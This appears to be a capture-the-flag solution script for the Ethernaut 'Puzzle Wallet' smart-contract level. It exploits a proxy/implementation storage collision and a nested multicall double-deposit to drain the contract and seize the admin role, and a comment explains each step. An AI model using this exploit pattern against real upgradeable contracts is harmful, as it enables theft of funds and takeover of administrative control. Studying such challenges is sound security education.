import { ethers } from "hardhat";
import { Contract } from "ethers";
import { abi as puzzleWalletABI } from "../../artifacts/contracts/24.PuzzleWallet/PuzzleWallet.sol/PuzzleWallet.json";
import { abi as puzzleProxyABI } from "../../artifacts/contracts/24.PuzzleWallet/PuzzleProxy.sol/PuzzleProxy.json";
import { displayResult } from "../../utils/displayResult";
import { getEthBalance } from "../../utils/getEthBalance";

const targetAddress = "0x6B294dc46713C40219299e70D800a06ebc04a91D";

async function main() {
  const [attacker] = await ethers.getSigners();
  const proxy = new Contract(targetAddress, puzzleProxyABI, attacker);
  const implementation = new Contract(targetAddress, puzzleWalletABI, attacker);
  const deposit = implementation.interface.getSighash("deposit");
  const multicallWithDeposit = implementation.interface.encodeFunctionData(
    "multicall",
    [[deposit]]
  );
  let valueToSend = await getEthBalance(targetAddress);
  valueToSend = ethers.utils.parseEther(valueToSend.toString()).toString();

  let tx = await proxy.proposeNewAdmin(attacker.address);
  await tx.wait();
  tx = await implementation.addToWhitelist(attacker.address);
  await tx.wait();

  tx = await implementation.multicall([deposit, multicallWithDeposit], {
    value: valueToSend,
  });

  await tx.wait();

  valueToSend = await getEthBalance(targetAddress);
  valueToSend = ethers.utils.parseEther(valueToSend.toString()).toString();
  tx = await implementation.execute(attacker.address, valueToSend, "0x");

  await tx.wait();

  tx = await implementation.setMaxBalance(attacker.address);
  await tx.wait();

  displayResult((await proxy.admin()) === attacker.address);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});

/*  Explanation of the code:

    owner and maxBalance variable from PuzzleWallet contract overlaps with
    pendingAdmin and admin variable from PuzzleProxy contract. So if we change 
    the owner variable and the maxBalance we actually change the pendingAdmin
    and the admin (vice versa).
    So first we change pendingAdmin to become owner of the PuzzleWallet.
    Then we whitelist our address.
    To change the maxBalance (so the admin) we must use the setMaxBalance function.
    We can use it only if we drain the contract first.
    To do so we have to set our balances(attacker.address) to be equal to the contract
    actual balance.
    Multicall is protected against multiple deposit but not against multiple multicall.
    So we can use it to drain the contract.
    We now just have to setMaxBalance to our address and we are the admin of the contract.

  */
